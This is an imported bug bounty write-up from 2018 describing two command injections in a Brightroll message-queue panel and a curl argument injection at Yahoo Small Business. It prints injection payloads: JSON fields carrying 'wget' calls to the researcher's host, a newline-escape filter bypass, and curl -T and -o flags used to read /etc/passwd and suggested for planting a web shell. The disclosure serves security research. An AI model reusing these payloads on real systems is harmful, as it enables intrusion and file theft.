---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-04-30_how-i-found-29-rce-at-yahoo-bug-bounty-program.md
original_filename: 2018-04-30_how-i-found-29-rce-at-yahoo-bug-bounty-program.md
title: How I found 2.9 RCE at Yahoo! Bug Bounty program
category: documents
detected_topics:
- command-injection
- ssrf
- api-security
- cloud-security
tags:
- imported
- documents
- command-injection
- ssrf
- api-security
- cloud-security
language: en
raw_sha256: 5ad9a7df1e30d8b3d86b1d8e3679bb1dc5098ebab735e757a1e2b0b8227ea6a4
text_sha256: 091973db91583666ade39baa4693f3a7c7e3d0585e55c6d0002dc9753e8c3082
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# How I found 2.9 RCE at Yahoo! Bug Bounty program

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-04-30_how-i-found-29-rce-at-yahoo-bug-bounty-program.md
- Source Type: markdown
- Detected Topics: command-injection, ssrf, api-security, cloud-security
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `5ad9a7df1e30d8b3d86b1d8e3679bb1dc5098ebab735e757a1e2b0b8227ea6a4`
- Text SHA256: `091973db91583666ade39baa4693f3a7c7e3d0585e55c6d0002dc9753e8c3082`


## Content

---
title: "How I found 2.9 RCE at Yahoo! Bug Bounty program"
url: "https://medium.com/@kedrisec/how-i-found-2-9-rce-at-yahoo-bug-bounty-program-20ab50dbfac7"
authors: ["Kedrisec (@kedrisec)"]
programs: ["Yahoo! / Verizon Media"]
bugs: ["RCE"]
publication_date: "2018-04-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5894
scraped_via: "browseros"
---

# How I found 2.9 RCE at Yahoo! Bug Bounty program

How I found 2.9 RCE at Yahoo! Bug Bounty program
Kedrisec
Follow
4 min read
·
Apr 30, 2018

581

5

Hi. I’m kedrisec and I want to describe 3 vulnerabilities that I found as part of the security research at Yahoo Bug Bounty program. So, lets begin.

Foreword

The Yahoo’s Bug Bounty program include a lot of services and I decided to work around Brightroll.

First RCE

I started with the regular thing when you do bug hunting, it’s reconnaissance. I do nothing irregular: Google, Aquatone etc…

So, when Aquatone show me some interesting port I decided to work around it. That’s what I saw:

Press enter or click to view image in full size
Queue list

Looks like something insteresting, doesn’t it? Ok, It’s time to explore the functional of this thing. As I understood this panel used for creating some tasks(messages) like a RabbitMQ. So, when I clicked on one of the queues I saw the next picture:

Press enter or click to view image in full size
Message lists

This is a lists of messages of the queue. I decide to click on “New Message” link and I saw form (It seemed strange for me because I had no idea what is that):

Press enter or click to view image in full size
Strage form

When I tried to create a new message I was filling this fields randomly. After that I clicked to the submit button and I was redirected to the page of my freshly created message. I saw the window that looks like terminal but I couldn’t write to it anything. This window show me an error (I’m sorry but I haven’t screenshot of this).

Get Kedrisec’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I come back to message lists and choose one of them. I noticed that it show me filled “Strage” form. It was string in JSON format and looks like this:

json:{“sub_bound”:true,”hostname”:”REDACTED",”timestamp”:”2017/07/01/1649",”s3_key”:”REDACTED”,”nop”:false,”providers”:[“Google”,”AWS”],”version”:3,”checkin_queue”:”REDACTED","type":"REDACTED","interval_id":"REDACTED","pod_id":"22"}

I tried to create a new message with this value of parameter 1 field. And after redirect to created message I noticed that several of json values put in to string that was similar to bash command.

Press enter or click to view image in full size
Window like terminal

So, I just try to write “|wget mywebsite.com” aaaaaand it was working ^^. I’ve simplified the hacking process, actualy it was taking about 2 days of work.

Final payload was:

json:{“sub_bound”:true,”hostname”:”REDACTED",”timestamp”:”2017/07/01/1649",”s3_key”:”REDACTED”,”nop”:false,”providers”:[“Google”,”AWS”],”version”:3,”checkin_queue”:”REDACTED","type":"REDACTED","interval_id":"REDACTED","pod_id":"22|wget http://myhost.name"}

Brightroll RCE
Second RCE

Actually, it was the RCE via the same service that was in previous RCE.

After about 3 months I found the different host with the same service on the same port. But at this time my previous payload didn’t work. If I remember correctly the reason of it was that symbols | & ; ` { } were filtred. I could bypass it after 1 day working around it. The bypass looks like something that:

json:{“sub_bound”:true,”hostname”:”REDACTED”,”timestamp”:”2017/10/23/2248",”s3_key”:”REDACTED”,”nop”:false,”providers”:[“Google”,”AWS”],”version”:3,”checkin_queue”:”REDACTED”,”type”:”REDACTED”,”interval_id”:”REDACTED”,”pod_id”:”23\u000awget\u0020http://myhost.name"}

Third ALMOST RCE

This vulnerability is the most interesting of all my finds. So, I started my research of yahoosmallbusiness store after creating a few products to have access to functions related with it. While I was discovering a functional I noticed that when I visit email templates page ajax send a few requests to get path to the images of products that showed on the page. One of the requests was sended to objinfo_data.php with parameter id. As I thounght this script was used to resize products image. So, this part is important. When I was creating a products I notice that request that used to create product containt a couple of urls to image but not directly binary image data. My suggestion was that: “What if the script get the link of product image and use it to resize.”. I thought it’s may be SSRF. I edited the product, changed image url to my host and port and runned netcat. After that I use product id of this product in request to objinfo_data.php. Netcat showed me the request and I noticed that User-Agent was Curl. After that I tried to get RCE any possible ways, but have no results:( It just wasn’t working. After all my torment’s I decide to ask my collegues about it. One of them offered to try to use “-A something” and if I will see “User-Agent: something” in the request in netcat it’s possble to injection to argument string. I tried and it worked! After that another my collegue immediately offer to me use flag -T. This flag get file from file system and attach it to request. I used it and was able to read /etc/passwd.

Why I called it almost RCE when I cant execute another commands? Because curl have another interesting flag “-o” this flag can be used to write output to file system. Therefore, If I could found web directory on the server, I just was able to write web-shell there and (if it was over firewall) execute it via curl :)

Yahoo Small Business curl argument injection.
